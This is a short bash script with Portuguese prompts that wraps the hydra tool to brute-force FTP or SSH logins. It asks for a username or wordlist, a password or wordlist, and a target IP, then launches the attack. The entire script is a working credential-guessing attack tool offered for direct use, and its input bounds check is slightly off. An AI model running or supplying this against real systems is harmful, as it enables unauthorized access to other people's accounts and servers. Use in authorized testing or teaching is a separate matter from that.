#!/bin/bash
export LANG=C.UTF-8

#variaveis 
funcexec=('ftp' 'ssh')
echo -e "brute force ftp -> 1"; read -p 'brute force ssh -> 2: ' select
select=$(($select-1))

ftp(){
	printf "você escolheu o ataque no ftp\nexemplo l user ou  L wordlist\n"
	read -p 'l user ou L wordlist: ' usr
	echo "exemplo p senha ou P wordlist"
	read -p 'p user ou P wordlist: ' psw
	read -p 'ip: ' ip
	hydra -$usr -$psw $ip "ftp"
}

ssh(){
	echo "você escolheu o ataque no ssh"
	read -p 'l user ou L wordlist: ' usr
	echo "exemplo p senha ou P wordlist"
	read -p 'p user ou P wordlist: ' psw
	read -p 'ip: ' ip
	hydra -$usr -$psw $ip "ssh"
}

if [ $select -gt ${#funcexec[@]} ]; then
	echo "valor invalido"
else
	${funcexec[$select]}
fi